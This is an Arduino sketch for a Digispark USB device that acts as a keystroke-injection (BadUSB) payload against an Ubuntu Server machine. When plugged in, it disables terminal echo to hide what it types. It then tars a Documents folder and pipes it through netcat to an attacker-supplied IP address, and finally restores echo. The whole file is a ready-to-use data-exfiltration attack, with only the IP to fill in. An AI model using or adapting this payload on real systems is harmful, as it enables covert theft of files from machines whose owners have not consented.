#include "DigiKeyboard.h"

// Meant to run on Ubuntu Server

void setup() {
  // put your setup code here, to run once:

}

bool finished = false;
void loop() {
  if (not finished) {
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(250);
    
    // disable terminal echoing
    DigiKeyboard.print("stty -echo");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    
    // send the 'test_files' folder to your computer
    //  ** replace the IP address (and port number, if you want) with your computer's IP address **
    DigiKeyboard.print("tar czp Documents/test_files | nc -N [receiving computer's IP address] 1234");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(3000);
    
    // quit process if it hasn't already quit
    DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
    DigiKeyboard.delay(500);
    
    // re-enable terminal echoing
    DigiKeyboard.print("stty echo");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    
    finished = true;
  }
}
